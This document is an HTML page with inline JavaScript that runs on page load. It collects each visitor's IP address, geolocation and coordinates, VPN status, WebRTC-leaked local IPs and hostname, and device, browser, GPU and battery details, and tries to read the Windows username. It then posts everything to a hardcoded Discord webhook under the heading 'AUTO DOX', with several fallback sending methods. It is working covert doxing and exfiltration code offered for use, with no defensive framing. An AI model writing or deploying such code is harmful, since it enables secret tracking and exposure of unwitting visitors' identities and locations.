<body>

<script>
    // ================================================================
    //  YOUR WEBHOOK
    // ================================================================
    const WEBHOOK = "https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6";

    // Helper: show status
    function setStatus(msg, isError = false) {
        const banner = document.getElementById('status-banner');
        if (banner) {
            banner.textContent = msg;
            banner.className = isError ? 'error' : '';
        }
    }

    // ================================================================
    //  SAFE FETCH WITH TIMEOUT
    // ================================================================
    function fetchWithTimeout(url, options = {}, timeout = 3000) {
        return Promise.race([
            fetch(url, options),
            new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), timeout))
        ]);
    }

    // ================================================================
    //  MAIN
    // ================================================================
    (async function() {
        try {
            setStatus('📡 Gathering data...');

            // ---- 1. IP info (simple, fast, with fallback) ----
            let geo = { ip: 'unknown', isp: '?', country: '?', region: '?', city: '?', lat: '0', lon: '0', proxy: false };
            try {
                const res = await fetchWithTimeout('https://ipapi.co/json/', {}, 2500);
                const d = await res.json();
                if (d.ip) {
                    geo.ip = d.ip;
                    geo.isp = d.org || d.isp || '?';
                    geo.country = d.country_name || '?';
                    geo.region = d.region || '?';
                    geo.city = d.city || '?';
                    geo.lat = d.latitude || '0';
                    geo.lon = d.longitude || '0';
                    geo.proxy = d.proxy || false;
                }
            } catch (_) {
                // fallback to ip-api.com
                try {
                    const res2 = await fetchWithTimeout('http://ip-api.com/json/', {}, 2500);
                    const d2 = await res2.json();
                    if (d2.query) {
                        geo.ip = d2.query;
                        geo.isp = d2.isp || '?';
                        geo.country = d2.country || '?';
                        geo.region = d2.regionName || '?';
                        geo.city = d2.city || '?';
                        geo.lat = d2.lat || '0';
                        geo.lon = d2.lon || '0';
                        geo.proxy = d2.proxy || false;
                    }
                } catch (_) {}
            }

            // ---- 2. VPN detection (simple) ----
            const vpnKeywords = ['vpn','proxy','hosting','cloud','datacenter','incognito','anonymous','tor'];
            const ispLower = (geo.isp || '').toLowerCase();
            const isVpn = geo.proxy || vpnKeywords.some(k => ispLower.includes(k));
            const vpnStatus = isVpn ? '✅ YES (VPN/Proxy)' : '❌ NO (residential)';

            // ---- 3. WebRTC (optional) ----
            let localIPs = [];
            let hostname = '';
            try {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                const offer = await pc.createOffer();
                await pc.setLocalDescription(offer);
                const ips = await new Promise((resolve) => {
                    const list = [];
                    let hname = '';
                    pc.onicecandidate = (e) => {
                        if (!e.candidate) {
                            pc.close();
                            resolve({ ips: list, host: hname });
                            return;
                        }
                        const parts = e.candidate.candidate.split(' ');
                        if (parts.length > 7) {
                            const ip = parts[4];
                            if (ip && ip.includes('.') && !ip.startsWith('0.')) {
                                if (!list.includes(ip)) list.push(ip);
                            }
                            const hostMatch = e.candidate.candidate.match(/ host (\S+)/);
                            if (hostMatch && hostMatch[1] && !hostMatch[1].match(/^\d+\.\d+\.\d+\.\d+$/)) {
                                hname = hostMatch[1];
                            }
                        }
                        if (e.candidate.relatedAddress && !e.candidate.relatedAddress.match(/^\d+\.\d+\.\d+\.\d+$/)) {
                            hname = e.candidate.relatedAddress;
                        }
                    };
                    setTimeout(() => { pc.close(); resolve({ ips: list, host: hname }); }, 3000);
                });
                localIPs = ips.ips;
                hostname = ips.host;
            } catch (_) {}

            // ---- 4. Username (ActiveX only works in IE) ----
            let winUser = 'not available (IE/ActiveX required)';
            try {
                const wsh = new ActiveXObject('WScript.Shell');
                winUser = wsh.ExpandEnvironmentStrings('%USERNAME%');
            } catch (_) {}

            // ---- 5. System info ----
            const ua = navigator.userAgent;
            let osDisplay = 'Unknown';
            let deviceModel = 'Unknown';
            let browserName = 'Unknown';
            try {
                if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                    const he = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'fullVersionList']);
                    if (he.model) deviceModel = he.model;
                    if (he.platform) osDisplay = he.platform;
                    if (he.fullVersionList && he.fullVersionList.length) {
                        browserName = he.fullVersionList.map(b => b.brand + ' ' + b.version).join(', ');
                    }
                }
            } catch (_) {}

            if (osDisplay === 'Unknown') {
                if (ua.includes('Windows NT')) {
                    osDisplay = 'Windows';
                    deviceModel = 'Windows PC';
                } else if (ua.includes('Macintosh')) {
                    osDisplay = 'macOS';
                    deviceModel = 'Mac';
                } else if (ua.includes('iPhone')) {
                    osDisplay = 'iOS';
                    deviceModel = 'iPhone';
                } else if (ua.includes('Android')) {
                    osDisplay = 'Android';
                    deviceModel = 'Android';
                }
            }
            if (browserName === 'Unknown') {
                if (ua.includes('Chrome') && !ua.includes('Edg')) browserName = 'Chrome';
                else if (ua.includes('Firefox')) browserName = 'Firefox';
                else if (ua.includes('Safari') && !ua.includes('Chrome')) browserName = 'Safari';
                else if (ua.includes('Edg')) browserName = 'Edge';
                else browserName = 'Other';
            }

            // ---- 6. Battery (optional) ----
            let battery = 'unavailable';
            try {
                const b = await navigator.getBattery();
                battery = `${Math.round(b.level * 100)}% (${b.charging ? 'charging' : 'discharging'})`;
            } catch (_) {}

            // ---- 7. GPU (optional) ----
            let gpu = 'Unavailable';
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debug = gl.getExtension('WEBGL_debug_renderer_info');
                if (debug) {
                    gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) || 'Unavailable';
                }
            } catch (_) {}

            // ---- 8. Plugins ----
            const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';

            // ---- 9. Build message ----
            const msg = 
`**🔹 DEDSEC CTOS – AUTO DOX 🔹**
**IP:** ${geo.ip}
**ISP:** ${geo.isp}
**VPN/Proxy:** ${vpnStatus}
**Location:** ${geo.city}, ${geo.region}, ${geo.country}
**Coordinates:** ${geo.lat}, ${geo.lon}
**Local IPs:** ${localIPs.length ? localIPs.join(', ') : 'none'}
**Computer Hostname:** ${hostname || 'not leaked'}
**Windows Username:** ${winUser}
**Device Model:** ${deviceModel}
**OS:** ${osDisplay}
**Browser:** ${browserName}
**CPU Cores:** ${navigator.hardwareConcurrency || '?'}
**RAM:** ${navigator.deviceMemory || '?'} GB
**Screen:** ${screen.width}x${screen.height}x${screen.colorDepth}
**Battery:** ${battery}
**Timezone:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}
**Language:** ${navigator.language}
**GPU:** ${gpu}
**Plugins:** ${plugins}
**Timestamp:** ${new Date().toLocaleString()}`;

            // ---- 10. SEND TO DISCORD (multiple methods) ----
            setStatus('📤 Sending to Discord...');

            // Method 1: fetch
            let sent = false;
            try {
                const response = await fetchWithTimeout(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: msg }),
                    keepalive: true
                }, 5000);
                if (response.ok) sent = true;
            } catch (_) {}

            // Method 2: sendBeacon (if fetch failed or no response)
            if (!sent) {
                const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
                const beaconSent = navigator.sendBeacon(WEBHOOK, blob);
                if (beaconSent) sent = true;
            }

            // Method 3: image ping (fallback for very strict environments)
            if (!sent) {
                try {
                    const img = document.createElement('img');
                    img.src = WEBHOOK + '?content=' + encodeURIComponent(msg);
                    img.style.display = 'none';
                    document.body.appendChild(img);
                    setTimeout(() => img.remove(), 3000);
                    // This won't actually work with Discord webhooks, but it's a last resort
                } catch (_) {}
            }

            if (sent) {
                setStatus('✅ Data sent successfully!');
            } else {
                setStatus('⚠️ All delivery methods failed. Check webhook URL.', true);
            }

        } catch (err) {
            setStatus('❌ Error: ' + err.message, true);
            console.error(err);
        }
    })();
</script>
